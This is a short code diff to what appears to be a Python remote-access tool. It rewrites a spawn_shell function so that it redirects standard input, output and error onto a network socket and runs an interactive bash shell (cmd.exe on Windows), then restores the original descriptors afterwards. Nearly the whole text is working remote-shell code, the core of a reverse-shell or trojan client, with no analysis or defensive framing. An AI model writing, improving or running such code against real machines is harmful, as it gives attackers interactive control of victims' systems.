@@ -8,17 +8,27 @@ import pickle
 import struct
 import imutils
 import platform
+import time
 
 # Supposed to be a stable bash shell, works
 # on the client but not on the server
 
 def spawn_shell(s):
+	stdin = os.dup(0)
+	stdout = os.dup(1)
+	stderr = os.dup(2)
 	
-	os.dup2(s.fileno(), 0)
-	os.dup2(s.fileno(), 1)
-	os.dup2(s.fileno(), 2)
 	if platform.system() == 'Linux':
-		subprocess.run(["/bin/sh","-i"])
+		os.dup2(s.fileno(), 0)
+		os.dup2(s.fileno(), 1)
+		os.dup2(s.fileno(), 2)
+		subprocess.run(["/bin/bash","-i"])
+		os.dup2(stdin, 0)
+		os.dup2(stdout, 1)
+		os.dup2(stderr, 2)
+		os.close(stdin)
+		os.close(stdout)
+		os.close(stderr)
 	elif platform.system() == 'Windows':
 		subprocess.run(["cmd.exe"])
 
